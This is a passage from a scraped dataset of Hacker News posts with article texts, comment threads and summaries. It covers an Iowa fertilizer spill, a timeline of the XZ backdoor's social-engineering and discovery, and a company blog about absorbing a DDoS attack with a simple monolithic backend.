PaperSubscribe 246 Share full article 246 America’s Vulnerable Water Systems Paying the Price: Siemens and other corporations vowed to fix water woes in Mississippi and save cities across the state millions. The deals racked up debt instead, leaving many worse off than before. A Tax on Groundwater: While American farmers elsewhere can freely pump the water beneath their land, growers in California’s Pajaro Valley pay hefty fees. Experts say the approach is a case study in how to save a vital resource. A Diet Feeding a Crisis: America’s dietary shift toward far more chicken and cheese in recent decades has taken a major toll on underground water supplies. First Come, First Served?: As the world warms, California is re-examining claims to its water that are based on a cherished frontier principle and have gone unchallenged for generations. Jets Powered by Corn: America’s airlines want to replace jet fuel with ethanol to fight global warming. That would require lots of corn, and lots of water. Blocking Change: Groundwater is dwindling in much of the United States, but only a powerful few have a say over its use. Meet the people fighting conservation efforts. ADVERTISEMENT SKIP ADVERTISEMENT",
    "commentLink": "https://news.ycombinator.com/item?id=39870402",
    "commentBody": "Iowa fertilizer spill kills nearly all fish across 60-mile stretch of rivers (nytimes.com)158 points by campuscodi 9 hours agohidepastfavorite20 comments perihelions 9 hours agoAmmonia is harmful to fish in the parts-per-billion range, https://edis.ifas.ufl.edu/publication/FA031 reply m463 6 hours agoparentI found \"aquarium cycling\" to be pretty interesting. To prepare aquariums filled with water for fish, the chemistry needs to be balanced. First you put in water. Then you add drops of ammonia in the water for a few days. Somehow magically bacteria that consume ammonia and produce nitrites start populating the tank. Keep going and a second set of bacteria populate the tank, that convert nitrites to nitrates. When those bacteria are present and stable (few weeks?) the fish can be introduced to the aquarium and they will survive. There's a further step, adding plants, that can consume the nitrates (which are coincidentally in fertilizer) This article made me think of this because fish produce ammonia, and without a way for an aquarium to remove it, they will die. reply bufferoverflow 6 hours agoprevWe need mandatory prison terms for large scale environmental damage. And heavy fines for smaller scale damage, enough to bankrupt. reply jackstraw14 2 hours agoparentBut it's always a company at fault, not someone you can throw in jail. reply notamy 9 hours agoprevhttp://archive.is/BQngO reply chias 8 hours agoprevOh look we're in the news again! I wonder if it's something good this time! It's never something good. reply bagels 8 hours agoprevIowa has some of the most polluted rivers because they completely kowtow to farmers who, apparently, don't care that they are completely ruining the environment or their own state's drinking water. It isn't new, but this is also worse than usual. reply renewiltord 9 hours agoprevThis happens in these states every so often. Fertilizer or pig shit or whatever wipes a river clean of all life. reply sn41 8 hours agoparentI lived in Iowa for about 10 years, couldn't agree with you more. I have good memories of the place, and have occasionally visited Atlantic,IA, which is off the Nishnabotna river, polluted by this incident. The state is very clean and livable as far as air pollution goes. Air pollution is almost non-existent. Water, on the other hand... A personal experience: I stopped washing my hair as reguarly as I used to when I was in Iowa, since it had started falling out. I thought, ageing, and what not. But when I stopped washing my hair more than twice a week, the hair-fall stopped. This was more than 20 years ago, and I still haven't balded much after that. I have always wondered whether it was related to the water quality. reply sexy_seedbox 7 hours agorootparentDid you get a blood test? reply sn41 45 minutes agorootparentNot back then, no. reply lostlogin 8 hours agoparentprevPhrased passively like this, it’s darkly hilarious. It’s preventable. reply aaomidi 8 hours agoprevSo sad :( reply BMc2020 8 hours agoprevSometimes we all make mistakes And sometimes we catch the real tough breaks But here's a trick that I've been working on Just say \"Oops!\", and move on Ran out of gas, maybe you stepped on broken glass Or spilled 100 million gallons of oil and screwed up the Earth Don't you get morose, take a weekend yatch trip of the English coast 'Cause it's all good, don't let the little people spoil your fun Just say \"Oops!\", and move on Henry Phillips reply DiabloD3 8 hours agoprevThrow their asses in prison, move on. Not sure what the big deal is, we live in a country where the rich are punished appropriately for their preventable and highly regulated behavior, right? reply killingtime74 8 hours agoprev [–] SSH compromise that's not really exploitable \"900 comments\", all fish dead within 60 miles \"5 comments\". reply Latty 8 hours agoparentI feel like it isn't a surprise Hacker News has more opinions on software security than enviornmental disaster. If you post about the backdoor to an environmental forum, I suspect it wouldn't gain as much traction. reply mmh0000 8 hours agoparentprevIt makes perfect sense; other replies have already made good arguments, but I'll add mine. I am not in agriculture. I know very little about farming, and there is nothing I can realistically do to fix or prevent agricultural mishaps. On the other hand, I am in Tech. I know a lot about computers, and there are things I can do and learn from the SSH article. Also, the SSH article is more scary than some dead fish (Yeah, dead fish suck, but that's 1000 miles away from me and a localized problem). The sophistication of the XZ attack is scary. It looks like a group of malicious actors did it. How widespread are attacks like this? We only learned about the `xz` attack because a brilliant person dug into a very minor side-effect caused by the attack. Is the Linux Kernel compromised in a similar attack? Who knows. What about the 2 billion other libraries a modern Linux system depends on? How will we detect and prevent this from happening in the future? reply kalkr 8 hours agoparentprev9 hours ago \"more comments\", 1 hour ago \"less comments\". reply saulrh 8 hours agoparentprev [–] For the average HNer, a fertilizer spill is unactionable. There's no digging I can do, nothing I can change. At most I can add it to the big list of things I should consider talking to my senators and representatives about. By contrast, the liblzma compromise is immediately actionable and HN is who should be reacting to it. I'd wager that some HN readers got paged this morning to deal with the liblzma compromise. There were debian and other distro maintainers on HN communicating about what they knew, what they were doing in response, and what the average HN reader should be doing. I wouldn't be surprised if a reasonable percentage of HN ran, not walked, to run updates on a potentially compromised Fedora installation. Furthermore, the data was all out in the open (git commit history, mailing lists) and in a format that HN readers are specialized for dealing with. A supply chain attack on openssh isn't just relevant to HN, it's the kind of thing that should be on HN because HN is full of the kind of person that we want to be spending time responding to this incident. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A fertilizer spill in Iowa led to the deaths of almost 800,000 fish in Iowa and Missouri rivers due to liquid nitrogen fertilizer leak from an open valve.",
      "This incident, one of Iowa's biggest fish kills, may take years for the ecosystem to restore fully, underscoring persistent water contamination concerns.",
      "The spill emphasizes the difficulties in enforcing stricter regulations in agricultural states, shedding light on ongoing water pollution challenges."
    ],
    "commentSummary": [
      "A fertilizer spill in Iowa wiped out most fish along a 60-mile river stretch, with ammonia being the key harmful component affecting the aquatic life.",
      "The incident underscores the environmental harm linked to agricultural practices and has sparked debates on enforcing harsher penalties for those causing such disasters.",
      "Some discussions shift to drawing parallels between environmental damage and software security concerns, highlighting differing urgencies in addressing these issues."
    ],
    "points": 158,
    "commentCount": 20,
    "retryCount": 0,
    "time": 1711757083
  },
  {
    "id": 39868673,
    "title": "Uncovering the XZ Backdoor: Risks of Individual Contributors",
    "originLink": "https://boehs.org/node/everything-i-know-about-the-xz-backdoor",
    "originBody": "Everything I Know About the Xz Backdoor state unstable in blog date 3/29/2024 😖 Unstable Updating at the speed of light, blink once and a word could be gone! These nodes are eratic, unstable, dangerous, but that's why they are fun. Please note: This is being updated in real time. The intent is to make sense of lots of simultaneous discoveries regarding this backdoor. last updated: 1:00 AM EST Update: The GitHub page for xz has been suspended. 2021 JiaT75 (Jia Tan) creates their GitHub account. The first commits they make are not to xz, but they are deeply suspicious. Specifically, they open a PR in libarchive: Added error text to warning when untaring with bsdtar. This commit does a little more than it says. It replaces safe_fprint with an unsafe variant, potentially introducing another vulnerability. The code was merged without any discussion, and lives on to this day (patched). libarchive should also be considered compromised until proven otherwise. 2022 In April 2022, Jia Tan submits a patch via a mailing list. The patch is irrelevant, but the events that follow are. A new persona – Jigar Kumar enters, and begins pressuring for this patch to be merged. Soon after, Jigar Kumar begins pressuring Lasse Collin to add another maintainer to XZ. In the fallout, we learn a little bit about mental health in open source. Three days after the emails pressuring Lasse Collin to add another maintainer, JiaT75 makes their first commit to xz: Tests: Created tests for hardware functions.. Since this commit, they become a regular contributor to xz (they are currently the second most active). It’s unclear exactly when they became trusted in this repository. Jigar Kumar is never seen again. Glyph @glyph@mastodon.social @eb I really hope that this causes an industry-wide reckoning with the common practice of letting your entire goddamn product rest on the shoulders of one overworked person having a slow mental health crisis without financially or operationally supporting them whatsoever. I want everyone who has an open source dependency to read this message https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.html Mar 29, 2024, 20:43 306 retoots 2023 JiaT75 merges their first commit on Jan 7 20231, which gives us good indication into when they fully gain trust. In March, the primary contact email in Google’s oss-fuzz is updated to be Jia’s, instead of Lasse Collin. Testing infrastructure that will be used in this exploit is committed. Despite Lasse Collin being attributed as the author for this, Jia Tan committed it, and it was originally written by Hans Jansen in June: Commit: liblzma: Add ifunc implementation to crc64_fast.c PR: Replaced crc64_fast constructor with ifunc by hansjans162 Hans Jansen’s account was seemingly made specifically to create this pull request. There is very little activity before and after. They will later push for the compromised version of XZ to be included in Debian. In July, a PR was opened in oss-fuzz to disable ifunc for fuzzing builds, due to issues introduced by the changes above. This appears to be deliberate to mask the malicious changes that will be introduced soon. 2024 A pull request for Google’s oss-fuzz is opened that changes the URL for the project from tukaani.org/xz/ to xz.tukaani.org/xz-utils/. tukaani.org is hosted at 5.44.245.25 in Finland, at this hosting company. The xz subdomain, meanwhile, points to GitHub pages. This furthers the amount of control Jia has over the project. A commit containing the final steps required to execute this backdoor is added to the repository: Tests: Add a few test files Tests: Update two test files The discovery An email is sent to the oss-security mailing list: backdoor in upstream xz/liblzma leading to ssh server compromise, announcing this discovery, and doing it’s best to explain the exploit chain. AndresFreundTec @AndresFreundTec@mastodon.social I was doing some micro-benchmarking at the time, needed to quiesce the system to reduce noise. Saw sshd processes were using a surprising amount of CPU, despite immediately failing because of wrong usernames etc. Profiled sshd, showing lots of cpu time in liblzma, with perf unable to attribute it to a symbol. Got suspicious. Recalled that I had seen an odd valgrind complaint in automated testing of postgres, a few weeks earlier, after package updates. Really required a lot of coincidences. Mar 29, 2024, 18:32 358 retoots A gist has been published with a very good high level technical overview and a “what you need to know” I understand this chain even less than the original author, but here is me half reciting, half making sense of what’s happening: This isn't good yet, I'm still figuring it out A sudden push for inclusion A request for the vulnerable version to be included in Debian is opened by Hans: #1067708 - xz-utils: New upstream version available This request was opened the same week Hans’ Debian account was created. The account created a few similar “update” requests in various low traffic repositories to build credibility, before asking for this one. A number of other, suspicious, anonymous name+number accounts with little former activity also push for its inclusion, including misoeater91 and krygorin4545. krygorin4545’s PGP key was made 2 days prior to today. Also seeing this bug. Extra valgrind output causes some failed tests for me. Looks like the new version will resolve it. Would like this new version so I can continue work. I noticed this last week and almost made a valgrind bug. Glad to see it being fixed. Thanks Hans! The Valgrind bugs mentioned were introduced by this malicious injection, as noted in the email to OSS-Security: Subsequently the injected code (more about that below) caused valgrind errors and crashes in some configurations, due the stack layout differing from what the backdoor was expecting. These issues were attempted to be worked around in 5.6.1: A pull request to a go library by a 1password employee is opened asking to upgrade the library to the vulnerable version, however, it was all unfortunate timing. 1Password reached out by email referring me to this comment, and everything seems to check out. A fedora contributor states that Jia was pushing for its inclusion in Fedora as it contains “great new features” Jia Tan also attempted to get it into Ubuntu days before the beta freeze. As of 9:00 PM UTC, GitHub has suspended JiaT75’s account. Thanks? They also banned the repository, meaning people can no longer audit the changes made to it without resorting to mirrors. Immensely helpful, GitHub. They also suspended Lasse Collin’s account, which is completely disgraceful. Important notes on LinkedIn I have received a few emails alerting me to a LinkedIn of somebody named Jia Tan2. Their bio boasts of large-scale vulnerability management. They claim to live in California. Is this our man? The commits on JiaT75’s GitHub are set to +0800, which would not indicate presence in California. This may have been a bad attempt to set the timezone to UTC-0800, which would be California. Most of the commits were made between UTC 12-17, which is awfully early for California. In my opinion, there is not sufficient evidence that the LinkedIn being discussed is our man. I think identity theft is more likely, but I am of course open to more evidence. 👟 Footnotes Thanks @joeyh@hachyderm.io ↩︎ I was also alerted to discussions of this on Gab, which should tell you what you need to know. ↩︎",
    "commentLink": "https://news.ycombinator.com/item?id=39868673",
    "commentBody": "Everything I Know About the XZ Backdoor (boehs.org)152 points by internetter 13 hours agohidepastfavorite26 comments adeon 11 hours agoThis mailing thread is quoted in the 2022 part on the page on the xz maintainer being pressured to add new maintainers for xz: https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.h... Seems like the usual story of some lone maintainer maintaining a popular project and losing their time and energy. The post doesn't spell it out but I wonder if they implied there's a suspicion that the person doing the pressuring there is also another sock puppet of JiaT75 as some scheme of getting access to xz. That would seem particularly cruel; take advantage of a tired maintainer with mental health issues to use their project to smuggle security exploits to the world. Regardless, be nice to people who are doing \"unpaid hobby projects\" your work depends on. Reading the thread made me sad. reply Hakkin 11 hours agoparent> The post doesn't spell it out but I wonder if they implied there's a suspicion that the person doing the pressuring there is also another sock puppet of JiaT75 as some scheme of getting access to xz You can get the user's e-mail by clicking the \"Reply via e-mail to\" on the page. It matches the @protonmail.com of the other sockpuppets, and the PGP key for the account was made 1 day prior to their first communication on that mailing list. reply radicaldreamer 11 hours agorootparentThis is an intelligence agency trying to add backdoors to archiving software... likely targeting other utilities as well with same MO reply Tuna-Fish 9 hours agorootparentThe backdoor targets OpenSSH. The reason it's added to xz is that because of a complex dependency chain, it ends up being compiled to build OpenSSH. As far as I can tell, the payload doesn't get deployed into anything else. reply mysidia 3 hours agorootparentprevIt's worrisome for sure.. the original maintainer mentions longterm mental health issues, \"but also due to some other things\" My worry would be \"other things\" they didn't mention can include deliberate acts of sabotage by said unknown agency. Devs can have health issues or other problems come up with themself or family in their personal lives, but also intelligence agents can tamper with people covertly in different ways such as deliberately causing various kind of accidents or contaminations/poisonings. In any case; they could only have to disrupt the developer's life for a few months to persuade them that they need to step down to put one of their confederates at the head of the project, I begin to worry for All developers' safety now if you are the sole maintainer of a key project critical system daemons may link against. reply Nextgrid 10 hours agorootparentprevDoubt the target is archiving software itself - presumably the reason these libraries got picked is because they already have high penetration across many layers of the stack which would ensure the backdoor has wide coverage. reply adeon 11 hours agorootparentprevAh I see, I wondered where the heck is a reply e-mail, I didn't see any reply email spelled out anywhere and didn't notice the button, I thought maybe the archive site deliberately wanted to hide the email adderesses. Kinda looks like everyone in the thread might be sock puppet? ...except for the xz maintainer. Oof. Now I'm just even more sad. Dammit Internet. reply jijijijij 10 hours agorootparentAssuming the original maintainer wasn't in on the con, someone should check on him. Apparently, he already got issues and being gaslit, manipulated and deceived on this level for years, considering the potential consequences and harm caused/barely averted, the unwanted attention, possibly police investigation following... all that may be a bit much. reply MaximilianEmel 4 hours agorootparentI hope he's doing alright. reply tomrod 11 hours agoprevWow. Timeline-wise this appears to be a clearly coordinated attempt, unless I'm missing something. reply goalieca 11 hours agoparentThe timeline suggests this is a patient hacker. The most patient of which are nation-states because they're not worried about cashflow and think in terms of years. reply imiric 11 hours agorootparentMakes one wonder how many instances of this goes unnoticed. Maybe this attacker got sloppy, but how many of them don't? We were lucky that one person noticed suspicious behavior and had the technical skills and patience to investigate, but how many of us don't? reply goalieca 10 hours agorootparentUndoubtedly they do. This is an example of why defence in depth is important. Things fail all the time for intentional and non-intentional reasons. A single point of failure can’t be allowed. reply Kluggy 10 hours agorootparentprevIt wasn't sloppy. It was just luck that someone noticed a half a second extra latency on the second connection of a newly run sshd process and went down the rabbit hole. Had they just shrugged and moved onto more \"important\" tasks/deliverables, it would most likely have landed in production across the world. I'm a tad reminded of https://xkcd.com/705/ We got so lucky here. We won't get lucky every time. We will have a massive breach one of these days. reply sunk1st 9 hours agorootparentI don’t think it was luck. I think some people are so in tune with their systems that investigating an anomaly like this is a frequent occurrence. This particular anomaly just happened to have an explosive ending. reply jeltz 1 hour agorootparentYes, I have met Andres in real life and I can totally believe that he is that in tune with his system. He wrote that he found this while benchmark PostgreSQL and saw weird load from ssh. He does a lot of benchmarking of PostgreSQL patches. But I would say it was also luck. If Andres hadn't been benchmarking on Debian Testing (or whatever system he found this on) this might have taken longer time to discover. reply 31337Logic 9 hours agorootparentprevKinda like Clifford Stoll! reply bananapub 9 hours agorootparentprev> Maybe this attacker got sloppy this attacker did not get sloppy, they got control of a critical piece of free software, and got a still-not-fully-understood piece of malware in to, past whatever peer review we like to imagine we have, then got it uploaded into at least two critical linux distributions, past whatever peer review we like to imagine we have, and was only found, two years in to the operation, by pure luck and a very dedicated engineer. reply asveikau 4 hours agorootparentIt was actually found less than two months after it was introduced in 5.6.0. Now, the attacker maintained the project for 2 years before that, and we don't know what else they inserted, but the known vulnerability was only in a release since February. reply fmajid 10 hours agorootparentprevMany: https://www.theregister.com/2022/02/23/chinese_nsa_linux/ reply dang 10 hours agoprevMain ongoing thread: Backdoor in upstream xz/liblzma leading to SSH server compromise - https://news.ycombinator.com/item?id=39865810 - March 2024 (744 comments) reply LegionMammal978 11 hours agoprevRegarding the libarchive change: > This commit does not do what it says it does. All it does, in fact, is replace safe_fprint with an unsafe variant, potentially introducing another vulnerability. The code was merged without any discussion, and lives on to this day. libarchive should also be considered compromised until proven otherwise. This is very far from the truth, from what I can tell. If you look at the PR, it does, in fact, add strerror(errno) to the end of the error line, as it claims in its description. And the switch from safe_fprintf() to regular fprintf() for the archive_error_string matches the rest of the codebase, which is scattered with calls to lafe_errc() and lafe_warnc() with archive_error_string (forwarding to vfprintf()). If the contents of that string were considered sensitive to print out, then it would hardly be a new vulnerability. Especially compare the code in tar/write.c, which calls fprintf(stderr) to output the archive_error_string in precisely the same way as the PR in question does. Note that safe_fprintf() has nothing at all to do with memory safety: its only purpose is to escape unprintable characters before printing them. Indeed, a stack overflow bug within the safe_fprintf() implementation was the subject of a CVE in 2022 [0]. [0] https://github.com/advisories/GHSA-c42q-jv3x-rq38 reply internetter 10 hours agoparentThanks, in my haste I misread. I removed the part claiming it didn't do what it says, though I maintain the changes made simultaneously is very suspect as there is no apparent motivation reply Bulat_Ziganshin 28 minutes agorootparentthe motivation is probably \"get foot in the door\". the attacker also made a few documentation-only PRs in various repos, but having code PR will make him more creditable, and also would help to add more backdoors to libarchive in the future and librachive is now part of Windows 10, being used as a universal archive decompression library in the Explorer reply hnthrowaway0328 7 hours agoprevThis might be the tip of the iceberg, especially if this is part of the work of a nation-state agency. Very persistent and clever though. reply hnthrowaway0328 6 hours agoprev [–] Some other thoughts: how many popular open source projects only have 1-2 maintainers? I guess there is a way to do a search. I assume 5+ is safer, if they are of different humans. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A backdoor in the Xz software was discovered, with Jia Tan, a suspicious contributor, playing a central role in making harmful code changes and pushing compromised versions into repositories.",
      "The post highlights the risks of depending heavily on individual contributors like Jia Tan without adequate support, raising industry-wide security concerns.",
      "Suspicious LinkedIn profiles and potential identity theft issues connected to Jia Tan are also addressed in the blog post."
    ],
    "commentSummary": [
      "A potential backdoor in the xz compression software raises concerns about an intelligence agency targeting OpenSSH.",
      "Suspicions suggest a coordinated effort to compromise the software, possibly by a nation-state agency, emphasizing the need for robust security measures.",
      "The post underscores the significance of having multiple maintainers for critical open-source projects to mitigate security risks effectively."
    ],
    "points": 152,
    "commentCount": 26,
    "retryCount": 0,
    "time": 1711744237
  },
  {
    "id": 39872686,
    "title": "Weathering a DDoS Storm with Simple Design and High-Performance Frameworks",
    "originLink": "https://tableplus.com/blog/2024/03/how-we-deal-with-ddos.html",
    "originBody": "We are under DDoS attack and we do nothing Huy Pham • March 29, 2024 We’re under DDoS Attack Someone has been attempting to DDoS us for weeks now. They have flooded our server with hundreds of millions of requests and attempted to download our setup file millions of times. (In the last 5 days alone, they tried to download it more than 800K times - our setup file is approximately 200MB per download.) Most of the traffic came from EU, specifically Germany and United Kingdom, here is the recently API call within 30 days. They have attempted to download the setup file millions of times (800,126 times in the last 5 days, totaling approximately 6 million times in the latest 30 days). The attack is still ongoing as we write this blog post. What we do in this hot situation. We do nothing, except watching them DDoS. We haven’t blocked any attacker IP addresses. Although we use Cloudflare, we haven’t activated the “Under Attack” mode. Our server CPUs are almost idle, typically at 0-1% usage most of the time during attack. In general, we barely do anything. Why? Because our services are capable of handling billions of requests per month without any issues, and it isn’t cost much. We have around 8 API services and its databases, all capable of handling billions of requests per month without caching. We have unlimited bandwidth with Cloudflare. How? Our TablePlus apps design are simple, and this philosophy extends to our backend services, where we keep things as minimal as possible. We avoid using third-party services like Vercel or Netlify for rendering, as they can become bottlenecks and surprise you with bills during attacks. Instead, we use our webservers, which have no limitations. In the past, the monolith was a bottleneck due to weak VPS/processors. However, with today’s powerful VPS, multiple-core processors, and high RAM at low prices, a monolith service can handle billions of requests per month in a single instance if implemented correctly. => Thus, we build a monolith service for each app, which is easy to deploy and maintain. No Docker, no Kubernetes, no dependencies, no runtime environment - just a binary file that can be deployed on any newly created VPS. Let’s talk about the Monolith Everyone tends to overcomplicate things, which isn’t an issue until you face pressure or limitations. We “heete” complexity, so we opt for the monolith. We consolidate everything an app needs into a single service: API, Website, Email, Payment… everything in one service. Deployment is straightforward: just one configuration file, build, and deploy. It’s lightning-fast when deploying or migrating services to another cloud vendor. Fewer dependencies make it easier to debug and identify bottlenecks. When there is an error, you don’t need to check as much because there is only a single service or just a few of them. Monolith frameworks you can choose from include: Golang: Echo, Gin… PHP: Laravel… Ruby: Rails… Rust: Actix, Rocket, Warp… When Done Right, a Single Web Framework of Golang or Rust Can Handle Billions of Requests Per Month without Any Problems Choose a high-performance framework; we prefer Golang and Rust. Index your databases to reduce fetching time, especially as the dataset grows. Separate the main database (which remains unchanged or not increases size over time) from the log/usage database (which grows over time) to ensure your core business isn’t impacted by performance issues. Use reverse proxy to handle and distribute requests to your core API. If you need multiple servers, it will greatly assist you. We use Nginx - which is powerful. Put everything behind Cloudflare and configure it properly (enable cache, Argo, full SSL between Cloudfare and your servers…). Use a CDN that has DDoS protection. We prefer Cloudflare R2 and its CDN over Amazon CloudFront + S3 for both cost savings and protection. Let’s talk about the deployment. At TablePlus, we’ve simplified the deployment process as much as possible. We don’t use Docker, Kubernetes, or any containers, or need to setup the enviroment. We use binaries. Binaries are fantastic; just copy them to any Linux server and run them as a process, just like running the TablePlus app on your macOS! When using binaries, you can let Linux Systemctl handle the process (by monitoring the process and restarting it if any fatal errors occur). We use everything natively; that is the best way to optimize performance. There is no CPU/RAM wasted on middle layers such as VMs, virtualization, or third-party infrastructure managers. We choose Golang and Rust because they’re not only high-performance languages but also capable of generating binary files for deployment.",
    "commentLink": "https://news.ycombinator.com/item?id=39872686",
    "commentBody": "We are under DDoS attack and we do nothing (tableplus.com)139 points by spacebuffer 2 hours agohidepastfavorite82 comments vasco 18 minutes agoBragging about this has to rank up there as the worst idea in the world. If your hole argument is taunting would be attackers with your wallet - saying you're more overprovisioned than the traffic they can send, you're just threatening them with a good time. At another time in my life I'd take this post as an invitation, even, specially because the numbers shared are super low. I've had 3 situations where my place of work was under DoS attack, in the 3 cases I managed to identify an email address and reached out asking why they are doing it, and if they want to talk about our backend. In 1 case, the \"attack\" was a broken script by someone learning how to program, the other two were real attacks and one of them just immediately stopped once they knew we knew who they were, the other actually wanted to chat and we emailed back and forward a bit. 99.99% of the time a DoS is someone who is bored. Talking to them tends to work. reply pdimitar 10 minutes agoparentHow did you deal with these three customers, if that's not a secret? RE: your tidbit on \"don't threaten bad actors with good time\", I disagree. If you can brag and demonstrate that their fleet of 10k machines can't touch a single service of yours and can't even make it pause then I'd say that sends pretty strong message to other potential bad actors. Those bad actors have to be discouraged. I would get a very nice ego trip if I knew I can show the finger to a state actor, metaphorically speaking. But again, they should get the message that they are not as dangerous as they think they are. Though I agree with other commenters that this traffic didn't seem as scary as the last 2-3 recorded attacks going through Cloudflare. reply YPPH 11 minutes agoparentprevI generally agree, but: >99.99% of the time a DoS is someone who is bored. Talking to them tends to work. This is an overstatement. A great number are extortionists or state sponsored attackers. They're not interested in chit chat, except if it's to negotiate a price to stop the flood. Particularly not the ones commanding resources which are sufficient enough to make a dent in the operations of a substantial commercial entity. reply rezonant 7 minutes agorootparentBlasting a site but sending no communication offering to make it stop doesn't sound like an extortionist. reply JoshTriplett 11 minutes agoparentprev> the other actually wanted to chat and we emailed back and forward a bit That sounds like a fascinating story. What did they want to chat about? reply pryce 8 minutes agoparentprevThis kind of proposal is one I hadn't ever really considered. I would be fascinated to know if others here have had similar experiences when seeking contact with malicious attackers. reply creatonez 7 minutes agoparentprevFeeding the trolls might be the worst idea in the world but it's certainly the best way to harden your infrastructure through extreme real-world testing :) reply ThePhysicist 59 minutes agoprev4 TB per month isn't really a DDoS attack, no? 4 TB per hour might qualify as a DDoS, but 4 TB per month is just 1.5 MB / second. 6 million requests per months are just 2 requests per second. I'd say the fact they run a monolith service isn't really relevant at this scale, especially as I assume Cloudflare handles most of the requests through caching them at the CDN level. reply buro9 37 minutes agoparentGiven that the vast majority of the web are Wordpress sites (or Drupal if you're a larger Org) that are on $5-20 per month multi-tenant hosts, have not installed caches, and speak directly to the database... the vast majority of sites on the internet can be knocked offline by merely doing 4 requests per second. That sounds crazy, right? But yet that's where we are. Context: I used to manage the DDoS protection at Cloudflare, and also the WAF, Firewall and some customer facing security projects, and we frequently either saw that web scraping took customers offline, or trivial and very low volume HTTP request rates took customers offline. In the early days we considered anything to be a DoS when it threatened our infra, but the threshold for customers is barely higher than a few concurrent and active users. The big numbers always make headlines, but it's the small numbers which most people feel. reply tbarbugli 47 minutes agoparentprevI think its around 1TB a day, but indeed still very small. reply tutfbhuf 38 minutes agorootparentYes, you can rent a few dollar VPS from e.g. Hetzner (since Germany is mentioned in the blog post), and run a few wget commands in parallel in a loop on their 200MB setup file to easily reach 1TB a day. For a company, this should definitely not be something to worry about. However, if I were able to single out individual IPs that are attacking me, then I would simply block them, report them (use the abuse form from the hoster of the attacking IP), and call it a day. This way, you can at least hope that the hoster will do something about it, either by kicking the hacker off its platform or, if it is some kind of service reflection attack, inform the victim to close the security loophole on their server and remove themselves from the botnet. If your attacks originate from a vast amount of different IPs from Russia and China, consider geoblocking. reply tamrix 15 minutes agorootparentThe worst thing reporting an IP can do is increase your ranking on scamalitics. Cgnat is becoming common on home internet. You can share an IP with up to 128 other people. reply croes 30 minutes agoparentprevAt least 8TB. 4TB is UK only. reply saagarjha 59 minutes agoparentprevI guess that depends on how irregular the traffic is. reply ThePhysicist 57 minutes agorootparentSure, if every request triggers a very complex database transaction or computation, but if I understand correctly this is a simple file download endpoint that's probably cacheable. reply n4r9 47 minutes agorootparentI think OP means that the 6 million requests might not be evenly spread. They might only occur during 5 minutes of each day, for example. I don't know enough to know whether that's feasible. reply PreInternet01 30 minutes agoprevI'd hardly call that a DDoS attack: from the description given, the extra 8TB-or-so of monthly traffic seems to fall under \"annoyingly pointless abuse of services\"... As long as such abuse doesn't cause monetary or resource exhaustion concerns, it's quite OK to ignore it, but stories like \"whelp, turns out that 80% of the capacity of our auto-scaling fleet is not doing anything useful\" are depressingly common enough to at least keep an eye on things. My annoyance with this kind of abuse revolves mostly around logging: a majority of logs just showing the same set of hosts displaying the same pointless behavior over and over again. Again, not a huge issue if your log storage is cheap and plentiful (as it should be), but having some kind of way to automatically classify certain traffic as abusive and suppress routine handling of that is definitely a good idea. It's also a lot harder than it sounds! I can't count the number of times I've added classification logic to my inbound SMTP server that should pick up on outright, silly abuse (of which there is a lot when dealing with email), only to have it triggered by some borderline-valid scenario as well. Spending way too much time on going down successive rabbit holes is a great way not to get any real work done -- a great reason to outsource, or, if that's too much work as well or just too expensive, indeed just ignore the abuse, annoying though it is... reply Borg3 22 minutes agoparentYes!! Great idea.. Keep ignoring them. So they feel more encouraged to do more fishy things. That attitude made todays internet pretty much swamp. reply PreInternet01 16 minutes agorootparentThe TL;DR of my comment is \"I personally enjoy implementing automated solutions to relatively-low-volume abuse, but as long as it doesn't cause you any capacity concerns, I fully understand ignoring it, since it's hard\" Using that as a reason to assign me responsibility for the state of the internet seems... slight hyperbole? reply KingOfCoders 0 minutes agoprevDoesn't look like a real DDos attack to me with the traffic numbers (of course, No true Scotsman). reply headmelted 52 minutes agoprevIt’s great that this isn’t hurting them but it leaves out a lot that makes me a bit nervous about this being taken as advice. They’re advocating deploying a binary as preferable to using docker, fair enough, but what about the host running the binary? One of the reasons for using containers is to wrap your security hardening into your deployment so that anytime you do need to scale out you have confidence your security settings are identical across nodes. On that, the monolith talked about here can be hosted on a single VPS, again that’s great (and cheap!), but if it crashes or the hardware fails for any reason that’s potentially substantial downtime. The other worry I’d have is that tying everything into the monolith means losing any defence in depth in the application stack - if someone does breach your app through the frontend then they’ll be able to get right through to the backend data-store. This is one of the main reasons people put their data store behind an internal web service (so that you can security group it off in a private network away from the front-end to limit the attack surface to actions they would only have been able to perform through a web browser anyway). reply llm_trw 35 minutes agoparent>They’re advocating deploying a binary as preferable to using docker, fair enough, but what about the host running the binary? One of the reasons for using containers is to wrap your security hardening into your deployment so that anytime you do need to scale out you have confidence your security settings are identical across nodes. There is no universe in which _increasing your attack surface_ increases your security. reply rezonant 1 minute agorootparentConsidering the vast majority of exploits are at the application level (SQLi, XSS, etc), putting barriers between your various applications is a good thing to do. Sure, you could run 10 apps on 10+ VMs, but it's not cost efficient, and then you just have more servers to manage. If the choice is between run 10 \"bare metal\" apps on 1 VM or run 10 containers on 1 VM, I'll pick containers every time. reply headmelted 24 minutes agorootparentprevI agree in principal but not in practice here. If you’re using a typical docker host, say CoreOS, following a standard production setup, then running your app as a container on top of that (using an already hardened container that’s been audited), that whole stack has gone through a lot more review than your own custom-configured VPS. It also has several layers between the application and the host that would confine the application. Docker would increase the attack surface, but a self-configured VPS would likely open a whole lot more windows and backdoors just by not being audited/reviewed. reply zilti 3 minutes agorootparentYou'd have to be utterly incompetent to make a self-configured VPS have more attack surface. I have a FreeBSD server, three open ports: SSH with cert-login only, and http/https that go to nginx. No extra ports or pages for potentially vulnerable config tools. reply spockz 16 minutes agorootparentprevOn the other hand. If by using containers it has become more feasible for your employees to use something like AppArmor, the end result may be more secure than the situation where the binary just runs on the system without any protection. reply 7bit 23 minutes agoparentprev> One of the reasons for using containers is to wrap your security hardening into your deployment so that anytime you do need to scale out you have confidence your security settings are identical across nodes. This is false. Or so you think your host is secured by installing Docker? And when you scale, how do you get additional hosts configured? True is, when you use Docker you need to not only ensure that your containers are secure, but also your host (the services running your containers). And when you scale up, and you need to deploy additional hosts, they need to be just as secure. And if you're using infrastructure as code and configuration as code, it does not matter if you are deploying a binary after configuring your system, or Docker. reply enva2712 34 minutes agoparentprevAhh yes, security through obscurity - if 